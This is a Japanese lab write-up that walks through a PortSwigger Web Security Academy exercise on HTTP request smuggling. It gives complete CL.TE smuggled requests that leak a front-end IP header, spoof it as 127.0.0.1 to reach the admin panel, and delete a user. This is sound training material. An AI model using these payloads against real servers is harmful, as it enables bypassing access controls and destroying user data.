# HTTP リクエストの密輸を悪用してフロントエンド リクエストの書き換えを明らかにする

次のハッキングラボを実施します  
https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting  
このラボにはフロントエンド サーバーとバックエンドサーバーが含まれますが、フロントエンドサーバーはチャンク エンコーディングをサポートしていません。フロントエンド サーバーは、IP アドレスを含む受信要求に HTTP ヘッダーを追加します。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ブラウザからハッキングラボにアクセスします
- 3. ハッキングラボ URL/admin にアクセスしてみます  
     次のメッセージが確認できます

```
Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1
```

- 4. ホームページに戻り、任意のワードで検索します
- 5. POST / リクエストを send to repeater します
- 6. Setting で Repeater の Update content length のチェックボックスを外します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/8b1031a6-e20f-4f61-b906-8b54d6d8a882)

- 7. inspector で http/1 に設定します
- 8. 次のリクエストを 2 回送信します

```
POST / HTTP/1.1
Host: 0aec00cc04c7bf5e82c101b0004000f5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

2 回目の結果として、独自のヘッダーが自動的に追加されていることがっ確認できます
![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/2b1c5b62-c4a5-463d-80f8-e7eb31a2228c)

X-cFUrwS-ip: 106.155.0.128

- 9. 独自ヘッダーを付加して、2 回リクエストを送信します

```
POST / HTTP/1.1
Host: 0aec00cc04c7bf5e82c101b0004000f5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-cFUrwS-ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

管理者ページにアクセスでき、一般ユーザーの削除リンクが取得できます

```html
<span>carlos - </span> <a href="/admin/delete?username=carlos">Delete</a>
```

- 10. 削除リンクにアクセスするようにチャンク化されたリクエストを書き換えて、2 回送信します

```
POST / HTTP/1.1
Host: 0aec00cc04c7bf5e82c101b0004000f5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-cFUrwS-ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

2 回目のレスポンスでユーザーの削除ができました

```
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=PrTycj4zrlvB3Tvf9P1qJB0yeGmR9Y19; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```
